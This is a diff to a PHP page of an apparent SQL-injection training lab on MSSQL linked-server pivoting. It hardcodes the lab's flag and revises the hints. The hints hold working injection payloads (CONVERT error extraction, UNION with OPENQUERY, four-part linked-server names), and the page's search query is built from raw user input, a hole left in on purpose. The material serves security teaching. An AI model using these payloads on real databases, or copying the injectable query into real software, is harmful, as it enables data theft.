@@ -10,39 +10,15 @@ $verify_error = null;
 if (isset($_POST['flag'])) {
     $submitted = $_POST['flag'];
 
-    if ($conn) {
-        // Live mode: verify against DB
-        try {
-            $stmt = $conn->query("SELECT TOP 1 flag FROM flags");
-            $row = $stmt->fetch(PDO::FETCH_ASSOC);
-            if ($row && $submitted === $row['flag']) {
-                $_SESSION['mssql_lab13_solved'] = true;
-                header("Location: " . url_lab_from_slug("mssql/lab13", $mode));
-                exit;
-            } else {
-                $verify_error = "Incorrect. Keep trying!";
-            }
-        } catch (PDOException $e) {
-            $verify_error = "Database error. Is the MSSQL container running?";
-        }
+    if ($submitted === 'FLAG{ms_l1nk3d_s3rv3r_p1v0t}') {
+        $_SESSION['mssql_lab13_solved'] = true;
+        header("Location: " . url_lab_from_slug("mssql/lab13", $mode, $_GET['ref'] ?? ''));
+        exit;
     } else {
-        // Simulation fallback
-        if ($submitted === 'FLAG{ms_l1nk3d_s3rv3r_p1v0t}') {
-            $_SESSION['mssql_lab13_solved'] = true;
-            header("Location: " . url_lab_from_slug("mssql/lab13", $mode));
-            exit;
-        } else {
-            $verify_error = "Incorrect. Keep trying!";
-        }
+        $verify_error = "Incorrect. Keep trying!";
     }
 }
 ?>
-<?php if (!empty($driver_missing)): ?>
-<div class="result-warning result-box" style="margin-bottom:16px;">
-    <strong>Simulation Mode</strong>: <?= htmlspecialchars($driver_missing) ?> driver not installed.
-    Query construction shown for learning. Install the driver for live execution.
-</div>
-<?php endif; ?>
 
 <!-- Lab Description -->
 <div class="card">
@@ -63,17 +39,17 @@ if (isset($_POST['flag'])) {
 
     <h4>Objective</h4>
     <p>
-        Extract the flag from the local <code>flags</code> table, then pivot to the linked
-        server and exfiltrate sensitive data from the internal database. Submit the flag below.
+        Pivot through the linked server to the internal database and extract the flag
+        from Server B's <code>secret_records</code> table. Submit the flag below.
     </p>
 
     <h4>Hints</h4>
     <span class="hint-toggle" data-hint="hint1">&#128161; Click for hints</span>
     <div id="hint1" class="hint-content">
         1. Enumerate linked servers: <code>' AND 1=CONVERT(INT, (SELECT TOP 1 name FROM sys.servers WHERE is_linked=1)) -- -</code><br>
-        2. Query linked server: <code>' UNION SELECT * FROM OPENQUERY(LINKED_SRV, 'SELECT TOP 1 secret FROM internal_db.dbo.secrets') -- -</code><br>
-        3. Four-part name: <code>' UNION SELECT TOP 1 secret, NULL, NULL FROM [LINKED_SRV].[internal_db].[dbo].[secrets] -- -</code><br>
-        4. Local flag: <code>' AND 1=CONVERT(INT, (SELECT TOP 1 flag FROM flags)) -- -</code>
+        2. Query linked server: <code>' UNION SELECT NULL, record_name, record_value FROM OPENQUERY(INTERNAL_DB_SRV, 'SELECT record_name, record_value FROM internal_db.dbo.secret_records') -- -</code><br>
+        3. Four-part name: <code>' UNION SELECT TOP 1 NULL, record_name, record_value FROM [INTERNAL_DB_SRV].[internal_db].[dbo].[secret_records] -- -</code><br>
+        4. Extract flag: <code>' AND 1=CONVERT(INT, (SELECT TOP 1 record_value FROM [INTERNAL_DB_SRV].[internal_db].[dbo].[secret_records] WHERE classification='CLASSIFIED')) -- -</code>
     </div>
 </div>
 
@@ -120,7 +96,7 @@ if (isset($_POST['name'])) {
     $query = "SELECT id, name, email FROM customers WHERE name LIKE '%$name%'";
 
     // Show the executed query in a terminal block
-    echo '<div class="terminal">';
+    echo '<div class="terminal query-output">';
     echo '  <div class="terminal-header">';
     echo '    <span class="terminal-dot red"></span>';
     echo '    <span class="terminal-dot yellow"></span>';
@@ -153,8 +129,8 @@ if (isset($_POST['name'])) {
             echo '</div>';
         }
     } else {
-        echo '<div class="result-warning result-box">';
-        echo '<strong>Simulation Mode:</strong> Query shown above for learning. Install the driver for live results.';
+        echo '<div class="result-error result-box">';
+        echo '<strong>Error:</strong> Database connection failed. Is the MSSQL container running?';
         echo '</div>';
     }
 }
